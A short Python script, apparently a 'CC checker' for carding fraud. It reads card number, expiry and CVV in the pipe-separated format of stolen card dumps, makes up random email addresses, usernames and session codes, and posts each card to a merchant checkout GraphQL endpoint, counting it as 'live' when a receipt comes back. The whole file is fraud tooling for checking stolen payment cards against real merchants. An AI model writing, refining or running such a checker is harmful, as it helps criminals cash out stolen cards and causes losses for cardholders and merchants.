
import asyncio
import random
import string
import httpx

def find_between(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@yahoo.com"

def generate_username():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=20))
    return f"{name}{number}"

def generate_random_code(length=32):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

async def check_cc_live(cc_data):
    try:
        cc_num, mm, yy, cvv = cc_data.split("|")
        mm = int(mm)
        yy = int("20" + yy) if len(yy) == 2 else int(yy)

        user = generate_user_agent()
        acc = generate_random_account()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

        async with httpx.AsyncClient() as session:
            # Sample logic simulating request
            headers = {"User-Agent": user}
            json_data = {
                "credit_card": {
                    "number": cc_num,
                    "month": mm,
                    "year": yy,
                    "verification_value": cvv,
                    "name": "Say Barry",
                },
                "payment_session_scope": "godless.com",
            }
            response = await session.post("https://godless.com/checkouts/unstable/graphql", headers=headers, json=json_data)
            if "ProcessedReceipt" in response.text:
                return True
    except Exception as e:
        print(f"[ERROR] {e}")

    return False
